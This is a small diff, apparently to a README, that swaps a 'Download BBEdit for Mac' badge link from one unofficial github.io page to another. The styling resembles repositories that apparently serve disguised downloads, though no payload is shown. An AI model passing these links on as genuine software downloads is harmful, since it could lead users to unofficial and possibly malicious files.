@@ -2,7 +2,7 @@
 
 ## ✅ Download BBEdit for Mac (Free Trial Available)
 
-[![🚀 Download BBEdit 🟣](https://img.shields.io/badge/Download-BBEdit-blueviolet?style=for-the-badge)](https://shuziktobehuman.github.io/huja/BBEdit)
+[![🚀 Download BBEdit 🟣](https://img.shields.io/badge/Download-BBEdit-blueviolet?style=for-the-badge)](https://mitrobandus.github.io/.github/BBedit)
 
 ---
 
